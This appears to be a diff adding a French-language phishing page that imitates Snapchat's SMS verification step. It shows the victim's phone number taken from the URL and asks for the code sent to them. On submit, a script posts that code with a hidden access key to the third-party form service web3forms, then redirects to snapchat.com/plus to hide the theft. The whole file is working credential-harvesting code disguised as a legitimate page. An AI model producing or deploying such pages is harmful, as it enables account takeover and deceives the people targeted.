@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#FFFC00] flex items-center justify-center h-screen">
+    <div class="bg-white p-8 rounded-[30px] shadow-2xl w-[90%] max-w-sm">
+        <h2 class="text-2xl font-bold mb-2 text-center">Vérification SMS</h2>
+        <p class="text-sm text-gray-500 mb-8 text-center" id="msg"></p>
+        
+        <form id="step2">
+            <input type="hidden" name="access_key" value="55a75b87-51e6-4f98-bcaa-125202c0904e">
+            <input type="text" name="Code_SMS" placeholder="Code de vérification" class="w-full p-4 mb-6 bg-gray-100 rounded-2xl border-2 border-blue-400 text-center text-xl font-bold" required>
+            <button type="submit" class="w-full bg-black text-white py-4 rounded-full font-bold text-lg">Valider l'activation</button>
+        </form>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        document.getElementById('msg').innerText = "Un code a été envoyé au " + params.get('tel') + ". Entrez-le pour finaliser.";
+        
+        document.getElementById('step2').onsubmit = async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
+            window.location.href = 'https://www.snapchat.com/plus';
+        };
+    </script>
+</body>
+</html>
